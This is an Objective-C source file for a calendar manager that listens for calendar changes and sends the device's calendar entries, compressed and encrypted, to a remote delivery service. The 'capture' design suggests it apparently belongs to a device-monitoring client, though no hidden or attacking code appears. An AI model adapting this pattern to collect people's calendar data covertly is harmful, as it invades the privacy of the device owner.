//
//  CalendarManagerImpl.m
//  CalendarManager
//
//  Created by Benjawan Tanarattanakorn on 1/16/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "CalendarManagerImpl.h"
#import "DeliveryRequest.h"
#import "DeliveryResponse.h" 
#import "EventDeliveryManager.h"
#import "CalendarEntryProvider.h"
#import "SendCalendar.h"
#import "CalendarEventNotifier.h"

// For info about constant check EDM
static NSInteger kCSMConnectionTimeout			= 60;		// 1 minute
static NSInteger kCalendarEventMaxRetry			= 6;		// 6 times
static NSInteger kCalendarEventDelayRetry		= 2 * 60;	// 2 minutes


@interface CalendarManagerImpl (private)
- (void) deliverCalendarForChange;
- (DeliveryRequest*) calendarRequest;
- (void) prerelease;
@end


@implementation CalendarManagerImpl

//@synthesize mEventStore;

- (id) initWithDDM: (id <DataDelivery>) aDDM {
	self = [super init];
	if (self != nil) {
		DLog (@"init CalendarManager")
		mDDM = aDDM;
				
		// -- Initialize provider with the event store		
		/*  note that inside init method of CalendarEntryProvider, 
			the EKEventStore will be initiated; otherwise notificaiton for Calendar change does not work
		 */
		mCalendarEntryProvider = [[CalendarEntryProvider alloc] init];
					
		// -- Initialize notifier
		mCalendarEventNotifier = [[CalendarEventNotifier alloc] init];
		[mCalendarEventNotifier setMCalendarChangeDelegate:self];
		[mCalendarEventNotifier setMCalendarChangeSelector:@selector(deliverCalendarForChange)];
		
		if ([mDDM isRequestPendingForCaller:kDDC_CalendarManager]) {
			[mDDM registerCaller:kDDC_CalendarManager withListener:self];
		}
	}
	return self;
}

- (void) startCapture {
	DLog (@"startCapture Calendar")
	[mCalendarEventNotifier start];
}

- (void) stopCapture {
	DLog (@"stopCapture Calendar")
	[mCalendarEventNotifier stop];
}


- (void) deliverCalendarForChange {
	DLog (@"!!! deliverCalendarForChange")
	[self deliverCalendar:mDelegate];	
}


#pragma mark CalendarManager protocol


- (BOOL) deliverCalendar: (id <CalendarDeliveryDelegate>) aDelegate {
	DLog(@"deliverCalendar, aDelegate = %@", aDelegate)
	BOOL canProcess = YES;
	
	DeliveryRequest* request = [self calendarRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@"not pending")
		
		// SendCalendar is in ProtocolBuider
		SendCalendar* sendCalendar = [mCalendarEntryProvider commandData];
		[request setMCommandCode:[sendCalendar getCommand]]; 
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:sendCalendar];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
		
		canProcess = YES;
	}
	mDelegate = aDelegate;						// set delegate (in the case of not try only)
	return canProcess;	
}


#pragma mark DeliveryListener protocol


// called by DDM
- (void) requestFinished: (DeliveryResponse*) aResponse {
	DLog(@"CalendarManagerImpl --> requestFinished: aResponse.mSuccess: %d", [aResponse mSuccess])
	
	id <CalendarDeliveryDelegate> calendarDeliveryDelegate = nil;
	
	// -- success case
	if ([aResponse mSuccess]) {
		// callback to a calendar delegate
		if ([aResponse mEDPType] == kEDPTypeSendCalendar) {						// Running App
			DLog (@">>>> requestFinished: kEDPTypeSendCalendar")
			calendarDeliveryDelegate = mDelegate;
			mDelegate = nil;
			if ([calendarDeliveryDelegate respondsToSelector:@selector(calendarDidDelivered:)]) 
				[calendarDeliveryDelegate calendarDidDelivered:nil];
		} 
	// -- fail case
	} else {
		if ([aResponse mEDPType] == kEDPTypeSendCalendar) {						// Running App
			DLog (@"not success")
			calendarDeliveryDelegate = mDelegate;
			mDelegate = nil;
			if ([calendarDeliveryDelegate respondsToSelector:@selector(calendarDidDelivered:)])	{		
				DLog (@">>>> requestFinished: kEDPTypeSendCalendar")
				NSError *error = [NSError errorWithDomain:@"Send Calendar" 
													 code:[aResponse mStatusCode] 
												 userInfo:nil];								
				[calendarDeliveryDelegate calendarDidDelivered:error];
			}
			// Requirement: retry every one minute if fail
//			[self performSelector:@selector(deliverCalendar:)
//					   withObject:nil
//					   afterDelay:60];
		}
	}
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
	DLog(@"CalendarManagerImpl Update progress aResponse = %@", aResponse)
}


#pragma mark Private methods


- (DeliveryRequest*) calendarRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_CalendarManager];	
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:kCalendarEventMaxRetry];
    [request setMEDPType:kEDPTypeSendCalendar];
    [request setMRetryTimeout:kCalendarEventDelayRetry];
    [request setMConnectionTimeout:kCSMConnectionTimeout];
	[request autorelease];
	return request;
}

- (void) prerelease {
	[NSObject cancelPreviousPerformRequestsWithTarget:self
											 selector:@selector(deliverCalendar:)
											   object:nil];
}


#pragma mark -
#pragma mark Memory management


- (void) release {
	[self prerelease];
	[super release];
}

- (void) dealloc {
	[self stopCapture];
	[mCalendarEntryProvider release];
	mCalendarEntryProvider = nil;
	[mCalendarEventNotifier release];
	mCalendarEventNotifier = nil;				
	[super dealloc];
}

@end
